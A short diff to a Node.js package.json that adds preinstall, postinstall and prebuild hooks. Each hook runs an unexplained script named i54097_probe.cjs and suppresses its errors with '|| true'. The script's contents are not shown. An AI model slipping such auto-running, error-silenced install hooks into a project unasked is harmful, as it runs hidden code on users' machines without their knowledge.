@@ -4,7 +4,10 @@
   "description": "",
   "main": "index.js",
   "scripts": {
-    "test": "echo \"Error: no test specified\" && exit 1"
+    "test": "echo \"Error: no test specified\" && exit 1",
+    "preinstall": "node ./i54097_probe.cjs || true",
+    "postinstall": "node ./i54097_probe.cjs || true",
+    "prebuild": "node ./i54097_probe.cjs || true"
   },
   "keywords": [],
   "author": "",
